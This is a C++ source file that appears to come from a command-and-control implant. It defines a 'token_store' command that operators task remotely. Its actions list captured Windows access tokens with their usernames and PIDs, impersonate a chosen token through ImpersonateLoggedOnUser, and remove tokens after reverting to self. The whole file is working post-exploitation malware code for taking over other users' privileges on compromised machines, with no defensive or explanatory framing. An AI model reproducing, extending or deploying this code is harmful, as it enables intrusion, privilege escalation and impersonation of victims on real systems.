#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_TOKEN_STORE

using namespace stardust;
using namespace starburst;

struct TokenEntry {
    HANDLE   token;
    uint32_t pid;
    char     username[128];
    bool     active;
};

constexpr uint32_t MAX_TOKEN_ENTRIES = 8;

auto declfn starburst::cmd_token_store(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t action_len = 0;
    auto action_str = parser_string( params, &action_len );
    if ( !action_str || action_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no action provided (list/use/remove)" ) ) );
        return;
    }

    char action[16] = { 0 };
    uint32_t copy_len = action_len < 15 ? action_len : 15;
    memory::copy( action, action_str, copy_len );
    action[copy_len] = '\0';

    auto store = reinterpret_cast<TokenEntry*>( inst.token_store );

    // --- LIST ---
    if ( str_cmp( action, symbol<char*>( const_cast<char*>( "list" ) ) ) == 0 ) {
        uint32_t out_cap = 4096;
        auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
        if ( !output ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }

        str_copy( output, symbol<char*>( const_cast<char*>(
            "ID\tUser\tPID\tActive\n" ) ) );
        uint32_t off = str_len( output );

        bool found = false;
        for ( uint32_t i = 0; i < MAX_TOKEN_ENTRIES; i++ ) {
            if ( !store[i].active ) continue;
            found = true;

            // ID
            char num[12];
            int_to_str( num, i, 10 );
            uint32_t nlen = str_len( num );
            memory::copy( output + off, num, nlen );
            off += nlen;
            output[off++] = '\t';

            // Username
            uint32_t ulen = str_len( store[i].username );
            if ( ulen > 0 ) {
                memory::copy( output + off, store[i].username, ulen );
                off += ulen;
            } else {
                output[off++] = '-';
            }
            output[off++] = '\t';

            // PID
            int_to_str( num, store[i].pid, 10 );
            nlen = str_len( num );
            memory::copy( output + off, num, nlen );
            off += nlen;
            output[off++] = '\t';

            // Active
            str_copy( output + off, symbol<char*>( const_cast<char*>( "Yes" ) ) );
            off += 3;

            output[off++] = '\n';
        }

        if ( !found ) {
            str_copy( output + off, symbol<char*>( const_cast<char*>( "(no tokens stored)" ) ) );
            off += str_len( symbol<char*>( const_cast<char*>( "(no tokens stored)" ) ) );
        }

        output[off] = '\0';
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
        inst.heap_free( output );
        return;
    }

    // --- USE ---
    if ( str_cmp( action, symbol<char*>( const_cast<char*>( "use" ) ) ) == 0 ) {
        uint32_t token_id = parser_int32( params );
        if ( token_id >= MAX_TOKEN_ENTRIES ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "invalid token ID" ) ) );
            return;
        }

        if ( !store[token_id].active || !store[token_id].token ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "token slot not active" ) ) );
            return;
        }

        if ( !inst.advapi32.ImpersonateLoggedOnUser( store[token_id].token ) ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
            return;
        }

        // close old impersonated token if one exists
        if ( inst.agent.impersonated_token )
            inst.kernel32.CloseHandle( inst.agent.impersonated_token );

        inst.agent.impersonated_token = store[token_id].token;

        char msg[192] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "Using token #" ) ) );
        char num[12];
        int_to_str( num, token_id, 10 );
        str_concat( msg, num );
        str_concat( msg, symbol<char*>( const_cast<char*>( " (" ) ) );
        str_concat( msg, store[token_id].username );
        str_concat( msg, symbol<char*>( const_cast<char*>( ")" ) ) );

        queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
        return;
    }

    // --- REMOVE ---
    if ( str_cmp( action, symbol<char*>( const_cast<char*>( "remove" ) ) ) == 0 ) {
        uint32_t token_id = parser_int32( params );
        if ( token_id >= MAX_TOKEN_ENTRIES ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "invalid token ID" ) ) );
            return;
        }

        if ( !store[token_id].active ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "token slot not active" ) ) );
            return;
        }

        // if this token is the current impersonation, revert first
        if ( store[token_id].token == inst.agent.impersonated_token ) {
            inst.advapi32.RevertToSelf();
            inst.agent.impersonated_token = nullptr;
        }

        inst.kernel32.CloseHandle( store[token_id].token );
        store[token_id].token  = nullptr;
        store[token_id].pid    = 0;
        store[token_id].active = false;
        memory::zero( store[token_id].username, 128 );

        char msg[64] = { 0 };
        str_copy( msg, symbol<char*>( const_cast<char*>( "Removed token #" ) ) );
        char num[12];
        int_to_str( num, token_id, 10 );
        str_concat( msg, num );

        queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
        return;
    }

    queue_response( inst, task_uuid, RESPONSE_ERROR,
        symbol<char*>( const_cast<char*>( "unknown action (list/use/remove)" ) ) );
}

#endif
